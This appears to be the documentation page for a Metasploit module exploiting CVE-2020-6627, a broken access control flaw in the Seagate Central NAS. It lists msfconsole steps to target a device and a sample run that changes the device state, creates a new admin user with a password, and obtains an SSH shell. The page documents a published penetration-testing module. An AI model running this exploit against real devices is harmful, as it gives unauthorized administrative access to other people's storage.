## Description
This module exploits the broken access control vulnerability in Seagate Central External NAS Storage device. (CVE-2020-6627)
Subject product suffers several critical vulnerabilities such as broken access control. It makes it possible to changes the device state 
and register a new admin user witch is capable of ssh access.

## Vulnerable Application 
Seagate Central is your personal cloud, providing a centralized location to store your files
from your Windows and Mac, mobile devices, and social networks. Play movies and music
and view photos from Seagate Central throughout your home on your smart TV, game
console, and tablet, and on an Internet-connected mobile device while on the road. With
Seagate Central, you can keep your digital life centralized and organized. 
read more : https://www.seagate.com/files/www-content/support-content/external-products/seagate-central/en-us/seagate-central-user-guide-us.pdf

## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: `use exploit/linux/http/seagate_central_ssh_user_add`
  4. Do: `set rhost <ip>`
  5. Do: `set rport <port>`
  5. Do: `check`
```
[+] 192.168.1.20:80 The target is vulnerable.
```

## Scenarios
```
msf5 > use exploit/linux/http/seagate_central_ssh_user_add 
msf5 exploit(linux/http/seagate_central_ssh_user_add) > set rhost 192.168.1.27
rhost => 192.168.1.27
msf5 exploit(linux/http/seagate_central_ssh_user_add) > set rport 80
rport => 80
msf5 exploit(linux/http/seagate_central_ssh_user_add) > run

[*] Current device state: social
[+] State successfully changed !
[*] Creating new admin user...
[*] User: jesse3233
[*] Pass: OdSvdFcT
[+] 192.168.1.27:80 - Login Successful (jesse3233:OdSvdFcT)
[*] Found shell.

id
uid=1001(jesse3233) gid=1001
```
